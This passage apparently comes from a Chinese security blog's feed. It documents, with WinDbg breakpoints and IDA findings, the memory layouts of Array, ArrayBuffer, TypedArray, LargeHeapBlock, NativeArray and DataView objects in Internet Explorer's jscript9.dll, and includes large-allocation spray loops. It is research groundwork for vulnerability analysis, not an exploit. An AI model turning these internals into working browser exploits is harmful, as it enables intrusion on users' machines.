class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&quot;Done!&quot;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>目前已知的一个API是可以用于</li><li>当Array中存放多种类型数据时的情况是怎么样的？？？采用以下语句示例</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">&quot;Start!!!&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> an = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x30</span>);</span><br><span class="line">an[<span class="number">0</span>] = <span class="number">32</span>;</span><br><span class="line">an[<span class="number">1</span>] = <span class="string">&quot;PWN!!!&quot;</span>;</span><br><span class="line">an[<span class="number">2</span>] = &#123;&#125;;</span><br><span class="line">alert(an[<span class="number">0</span>]);</span><br><span class="line">alert(an[<span class="number">1</span>]);</span><br><span class="line">alert(an[<span class="number">2</span>]);</span><br><span class="line">alert(<span class="string">&quot;end&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>对代码使用windbg进行调试，因为有一次整数赋值，所以依然可以使用一个整数赋值的API来定位其赋值操作，下断、g，可以观察到此处赋值，使用pt命令执行到返回处，直接获取到Array对象地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp jscript9!Js::JavascriptArray::DirectSetItem_Full&lt;int&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229180435869.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229180550248.png" alt="picture"></p><ul><li>可以看到初始的赋值，然后直接运行，再break，查看这块内存情况</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229181047617.png" alt="picture"></p><ul><li>这里偶然发现了字符串的存储内容</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229181445003.png" alt="picture"></p><h2 id="ArrayBuffer对象"><a href="#ArrayBuffer对象" class="headerlink" title="ArrayBuffer对象"></a>ArrayBuffer对象</h2><h6 id="代码层-1"><a href="#代码层-1" class="headerlink" title="代码层"></a>代码层</h6><ul><li>ArrayBuffer对象代表存储二进制数据的一段内存，它不能直接读写，只能通过视图(TypedArray视图和DataView视图来读写)，视图的作用是以指定的格式读写二进制数据</li><li>ArrayBuffer的使用方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><ul><li>该ArrayBuffer生成了48字节的内存区域，每个字节的值默认都是0。如果要读写这块内存区域的内容，需要为它指定视图，创建一个DataView视图，来读取它的数据</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> DataVieW(ab)</span><br><span class="line">dv.getUint8(<span class="number">0</span>) <span class="comment">//值为0</span></span><br></pre></td></tr></table></figure><ul><li>同样可以使用TypedArray视图来处理ArrayBuffer中的数据，但TypedArray不只有单独一个类型，有一组类型可以使用</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">var</span> array1 = <span class="keyword">new</span> <span class="built_in">Int32Array</span>(ab);</span><br><span class="line">array1[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> array2 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(ab);</span><br><span class="line">array2[<span class="number">0</span>] = <span class="number">2</span></span><br><span class="line"><span class="built_in">console</span>.log(array1[<span class="number">0</span>]);  <span class="comment">//值为2</span></span><br></pre></td></tr></table></figure><ul><li>由于两个视图修改的是同一块内存，所以一个视图修改底层内存会影响到另一个视图</li></ul><h6 id="系统底层-1"><a href="#系统底层-1" class="headerlink" title="系统底层"></a>系统底层</h6><ul><li>上面讲述JS代码如何生成ArrayBuffer对象，接下来将调试js引擎底层Jscript9.dll来在系统底层中探索ArrayBuffer的结构,使用IDA反编译Jscript9.dll搜索跟ArrayBuffer相关的函数，最终定位到Js::JavascriptArrayBuffer::Create函数</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201224162836786.png" alt="picture"></p><ul><li>可以从代码中观察到该处利用malloc申请空间，使用windbg调试如下代码</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> an = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> fn = <span class="keyword">new</span> <span class="built_in">Int32Array</span>(an);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">fn[<span class="number">0</span>] = <span class="number">0x66</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&quot;break&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(fn[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>使用windbg附加到没有参数的IE进程，对上面分析到的ArrayBuffer::ArrayBuffer函数下断，由于系统会有很多申请的操作，可以下条件断点，当其参数中的Size(edi传入)为我们申请的空间大小时断下，断点如下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp Addr  &quot;if(edi!=0x100)&#123;gc&#125;&quot;   //addr 需要自行计算ArrayBuffer函数的偏移</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201224164855124.png" alt="picture"></p><ul><li>成功断下，继续调试到调用malloc地方，获取此处申请到的空间，根据IDA中的代码，这块内存后续会被覆盖为0</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201224174059712.png" alt="picture"></p><ul><li>顺便分析一下ArrayBuffer对象的结构，在ArrayBuffer中可以观察到，存放申请内存的地址的指针就是ArrayBuffer对象，其在这个函数中生成</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201224205204872.png" alt="picture"></p><ul><li>从代码中可以确定这个对象大小应该是0x24，使用windbg调试到上面函数返回ArrayBuffer对象处，可以观察到该对象的内存结构，通过与IDA中的结构分析，可以确定一下数据的信息</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201225100949114.png" alt="picture"></p><ul><li>通过IDA代码分析确定ArrayBuffer对象结构内容</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer</span><br><span class="line">0x00ArrayBuffer虚表</span><br><span class="line">0x04DynamicObject虚表</span><br><span class="line">0x1cArrayBuffer Memory</span><br><span class="line">0x20ArrayBuffer Memory Size</span><br></pre></td></tr></table></figure><h2 id="TypedArray"><a href="#TypedArray" class="headerlink" title="TypedArray"></a>TypedArray</h2><ul><li>刚刚提到了ArrayBuffer，同时TypedArray是可以对ArrayBuffer进行读写操作的，在系统底层这个对象是如何创建起来的？通过IDA分析，由于TypedArray有很多种类，所以这里不一一举例，拿Float32Array举例，TypedArray有两种申请方式</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一种以ArrayBuffer对象作为参数，其在读写时操作的内存为ArrayBuffer</span></span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="keyword">var</span> fn = <span class="keyword">new</span> <span class="built_in">Float32Array</span>(ab);</span><br><span class="line">fn[<span class="number">0</span>] = <span class="number">2.0</span>;</span><br></pre></td></tr></table></figure><ul><li>由于没有特别直接的API，所以需要先对ArrayBuffer创建处下断，然后对申请到的内存空间下访问断点，看断到赋值操作时的栈信息结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp jscript9!js::javascriptArrayBuffer::Create+0x53 &quot;.if(edi!=0x80)&#123;gc;&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229113541069.png" alt="picture"></p><ul><li>再次跑起来断下，查看调用栈</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229113739144.png" alt="picture"></p><ul><li>同时在IDA中定位该处调用，可以确定edi寄存器存放着TypedArray</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229114701016.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229115421723.png" alt="picture"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TypedArray对象结构</span><br><span class="line">0x00虚表</span><br><span class="line">0x04未知</span><br><span class="line">0x1c该对象结构的大小，如果传入的参数是ArrayBuffer则，是ArrayBuffer大小Size 除以 该Type的基础大小，例：float32Array传入的ArrayBuffer大小为0x80,则该处为0x80/0x4 = 0x20</span><br></pre></td></tr></table></figure><ul><li>如果使用第二种方式申请TypedArray对象，其调用方式略有不同</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二种直接传入大小参数</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="keyword">new</span> <span class="built_in">Float32Array</span>(<span class="number">0x80</span>);</span><br><span class="line">fn[<span class="number">0</span>] = <span class="number">3.0</span>;</span><br></pre></td></tr></table></figure><ul><li>由于TypedArray也是通过ArrayBuffer来存储数据的，所以即使没有定义ArrayBuffer，其内部的API会申请ArrayBuffer，可仍然在创建ArrayBuffer处下断，此时该处申请的大小应该为4*0x80 = 0x200。调试断下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp jscript9!js::javascriptArrayBuffer::Create+0x53 &quot;.if(edi!=0x200)&#123;gc;&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229142632615.png" alt="picture"></p><ul><li>调用栈结构</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229142701311.png" alt="picture"></p><h2 id="LargeHeapBlock对象"><a href="#LargeHeapBlock对象" class="headerlink" title="LargeHeapBlock对象"></a>LargeHeapBlock对象</h2><ul><li>LargeHeapBlock是一个无法在js代码中找到的对象，该对象会在大数组生成时创建，可以通过生成大量Array触发该对象的生成，如下代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">alert(<span class="string">&quot;start&quot;</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> an = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)</span></span><br><span class="line"><span class="javascript">&#123;</span></span><br><span class="line"><span class="javascript">an[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"><span class="javascript">an[i][<span class="number">0</span>] = <span class="number">0x66</span>;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">alert(<span class="string">&quot;Alloc 1&quot;</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">b[i] = <span class="keyword">new</span> <span class="built_in">Array</span>((<span class="number">0x1000</span>-<span class="number">0x20</span>)/<span class="number">4</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;b[i].length;++j)</span></span><br><span class="line"><span class="javascript">b[i][j] = <span class="number">0x111</span>;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">alert(<span class="string">&quot;Alloc 2&quot;</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)</span></span><br><span class="line"><span class="javascript">&#123;</span></span><br><span class="line"><span class="javascript">c[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x3bf8</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> j =<span class="number">0</span>;j&lt;c[i].length;++j)&#123;</span></span><br><span class="line"><span class="javascript">c[i][j] = <span class="number">0x222</span>;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">alert(<span class="string">&quot;done&quot;</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>这里使用生成大量Array数组来完成对LargeheapBlock的生成，这里设置三种申请的空间，测试获取申请的LargeHeapBlock的大小，以下几个API是关键定位的地方，查看IDA中的反汇编代码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jscript9!Js::JavascriptArray::DirectSetItem_Full&lt;int&gt;   //对Array数组元素进行赋值为整数会调用的API</span><br><span class="line">jscript9!Js::SparseArraySegment&lt;int&gt;::SetElement      //赋值函数</span><br><span class="line">jscript9!LargeHeapBlock::New         //申请LargeHeapBlock内存</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201228110810188.png" alt="picture"></p><ul><li><p>下断，调试，可以得到这三种申请方式下LargeHeapBlock的大小</p><ul><li>当申请Array大小为0x1000时，LargeHeapBlock大小为0x68</li></ul></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201228113534491.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201228113424638.png" alt="picture"></p><ul><li>当申请Array大小为(0x1000-0x20)/4时，LargeHeapBlock大小为0x8c</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201228113630573.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201228113710885.png" alt="picture"></p><ul><li>当申请Array大小为0x3bf8时，LargeHeapBlock大小为</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201228114238112.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201228114321996.png" alt="picture"><br>此处根据LargeHeapBlock传入代码的大小，可以确定申请大小公式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a/32 + a)*5+0x88   基础大小为0x58</span><br></pre></td></tr></table></figure><ul><li>此处也有个重要的点，确定Array对象</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">断到该处函数时，可以使用pt命令执行到函数返回处，该处的esi为赋值的数据、ecx为array存储数据的内存空间、edi为Array对象的地址</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229165722106.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229165756186.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201229165904467.png" alt="picture"></p><h2 id="NativeArray结构"><a href="#NativeArray结构" class="headerlink" title="NativeArray结构"></a>NativeArray结构</h2><ul><li>前面提到了Array结构，也得提一下Array中较为特殊的结构——NativeArray，实际上Array结构比较特别，其在确定其内部数据之后将会把自己确定为一种Array，下面举例实现</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//Int32Array</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&quot;Start!&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> an1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x50</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">an1[i] = <span class="number">0x30</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(an1[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//Float32Array</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> an2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x50</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">an2[i] = <span class="number">2.2</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(an2[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//NativeArray</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> an3 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">an3[<span class="number">0</span>] = <span class="number">3</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(an3[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//Array</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> an4 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x50</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">an4[<span class="number">0</span>] = <span class="number">0x30</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">an4[<span class="number">1</span>] = <span class="string">&quot;aaaa&quot;</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">an4[<span class="number">2</span>] = &#123;&#125;;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(an4[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&quot;End&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>首先看第一个数组<strong>an1</strong>，定位其赋值操作的函数仍然下以下断点，搜索相关的断点</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231155428285.png" alt="picture"></p><ul><li>第一个是进行int数据赋值，对对应的函数下断，跑起来，断下，查看esi是否为赋值的0x30</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp 0x653c4a71</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231155555366.png" alt="picture"></p><ul><li>直接使用pt命令执行到返回，查看ecx和edi数据，ecx中存放着Array对象控制的内存区域，edi中存放着Array对象的数据</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231155826499.png" alt="picture"></p><ul><li>继续运行直至全部赋值完，运行到Alert处，Break，再次查看Array对象数据</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231160249998.png" alt="picture"></p><ul><li>接下来查看第二个Array <strong>an2</strong>，对刚才搜索到的参数为double类型的函数进行下断，待其重新断下，此时不能通过esi来查看赋值数据，直接pt运行到函数返回处查看内存数据。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231160733786.png" alt="picture"></p><ul><li>再次运行到Alert显示数据处，查看</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231160828637.png" alt="picture"></p><ul><li>接下来查看<strong>an3</strong>,因为第三个Array是<strong>NativeArray</strong>，静态的Array，其对象结构稍有不一样，通过分析jscript9.dll定位到一处相关的API，在windbg中对这个Api进行搜索</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231162934238.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231163105369.png" alt="picture"></p><ul><li>这里确定有两个API,观察其IDA中的差异,发现两个函数仅仅是参数不一样，再通过引用发现被调用的地方也不一样，对两处函数均下断点，发现只会断在参数中包含uint的函数</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231171618041.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231171640938.png" alt="picture"></p><ul><li>观察断下的调用栈</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231172723238.png" alt="picture"></p><ul><li>所以确定了NativeArray的调用顺序，再IDA中查看反编译代码可以确定该函数返回处，eax存放着NativeArray对象，调试查看,但是没有完整的赋值，继续运行到alert语句，break，查看对象内存</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231173225356.png" alt="picture"></p><ul><li>可以发现NativeIntArray的结构和之前的Array发生了变化，其存放数据的buffer和对象在同一块内存空间中。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201231173648100.png" alt="picture"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NativeArray</span><br><span class="line">0x00虚表</span><br><span class="line">0x10Size</span><br><span class="line">0x14BufferAddr-----|</span><br><span class="line">0x38Buffer&lt;----|</span><br></pre></td></tr></table></figure><h2 id="DataView结构"><a href="#DataView结构" class="headerlink" title="DataView结构"></a>DataView结构</h2><ul><li>采用如下代码测试</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alert(&quot;Start!&quot;);</span><br><span class="line">var an = new Array(0x30);</span><br><span class="line">var dv = new DataView(new ArrayBuffer(0x80));</span><br><span class="line">an[0] = dv;</span><br><span class="line">alert(&quot;end!&quot;);</span><br></pre></td></tr></table></figure><ul><li>下两个断点，一个是查看ArrayBuffer的生成地址，另一个是Array的赋值和生成情况，以便观察DataView结构</li></ul><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp jscript9!js::javascriptArrayBuffer::Create+<span class="number">0</span>x53 <span class="string">&quot;.if(edi!=0x80)&#123;gc;&#125;&quot;</span></span><br><span class="line">bp jscript9!js::javascriptArray::DirectSetItem_Full</span><br></pre></td></tr></table></figure><ul><li>直接运行，待其断下，记录ArrayBuffer的地址，</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210104101326522.png" alt="picture"></p><ul><li>继续运行，断到Array数组赋值语句，运行到返回处(pt)，查看Array数组</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210104101446334.png" alt="picture"></p><ul><li>继续运行然后断下，查看Array中的DataView</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210104101740484.png" alt="picture"></p><ul><li>定位到DataView查看其结构，并且定位到了DataView创建函数</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210104170740441.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210104201328563.png" alt="picture"></p><ul><li>DataView读写数据的两种方式，</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alert(&quot;start&quot;);</span><br><span class="line">var dv1 = new DataView(new ArrayBuffer(0x10));</span><br><span class="line">var dv2 = new DataView(new ArrayBuffer(0x10));</span><br><span class="line">dv1.setInt32(0,0x666,true);</span><br><span class="line">dv2.setInt32(0,0x555,true);</span><br><span class="line">alert(&quot;read1&quot;);</span><br><span class="line">alert(DataView.prototype.getInt32.call(dv1,0,true));</span><br><span class="line">alert(&quot;read2&quot;);</span><br><span class="line">alert(dv2.getInt32.call(dv1,0,true));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JS中一些对象结构的研究&quot;&gt;&lt;a href=&quot;#JS中一些对象结构的研究&quot; class=&quot;headerlink&quot; title=&quot;JS中一些对象结构的研究&quot;&gt;&lt;/a&gt;JS中一些对象结构的研究&lt;/h1&gt;&lt;h2 id=&quot;Array对象&quot;&gt;&lt;a href=&quot;#Array对
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://richard447.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="jscript9" scheme="https://richard447.github.io/tags/jscript9/"/>
    
  </entry>
  
  <entry>
    <title>Emotet病毒分析</title>
    <link href="https://richard447.github.io/2020/10/29/Emotet%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <id>https://richard447.github.io/2020/10/29/Emotet病毒分析/</id>
    <published>2020-10-28T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
